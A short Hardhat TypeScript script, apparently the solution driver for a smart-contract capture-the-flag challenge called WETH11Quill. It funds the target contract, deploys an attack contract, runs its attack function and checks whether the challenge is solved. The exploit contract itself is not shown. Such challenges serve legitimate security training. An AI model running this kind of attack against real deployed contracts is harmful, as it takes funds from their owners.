import chalk from "chalk";
import { ethers } from "hardhat";
import { WETH11Quill__factory, WETH11Quill, WETH11QuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [weth11QuillContract, attacker] = await initialize<WETH11Quill>(WETH11Quill__factory);
    let deposit = await weth11QuillContract.deposit({value: ethers.parseEther("1")});
    await deposit.wait();
    let transfer = await weth11QuillContract.transfer(await weth11QuillContract.getAddress(), ethers.parseEther("1"));
    await transfer.wait();

    
    let weth11Attack = await new WETH11QuillAttack__factory(attacker).deploy();
    await weth11Attack.waitForDeployment();
    let tx = await weth11Attack.attack(await weth11QuillContract.getAddress());
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await weth11QuillContract.isSolved())}`); 
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});